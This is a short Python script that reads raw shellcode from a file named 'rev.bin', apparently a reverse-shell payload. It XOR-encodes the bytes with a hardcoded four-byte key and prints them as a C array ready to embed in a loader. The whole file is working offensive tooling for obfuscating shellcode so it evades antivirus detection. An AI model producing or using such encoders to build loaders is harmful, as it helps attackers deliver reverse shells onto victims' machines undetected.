#!/usr/bin/env python3
import sys

key = b'FHTW'

def format(shellcode): 
    result = "unsigned char pShellcode[] = {\n    "
    
    for i, byte in enumerate(shellcode, start=1):
        result += f"0x{byte:02X},"
        if i % 15 == 0:
            result += "\n    "
    
    return result.rstrip(",\n    ") + "\n};"

def xor(shellcode, key): 
    return bytes(shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode)))

if __name__ == '__main__': 

    with open('rev.bin', 'rb') as file:
        shellcode = file.read() 

    print(format(xor(shellcode, key)))
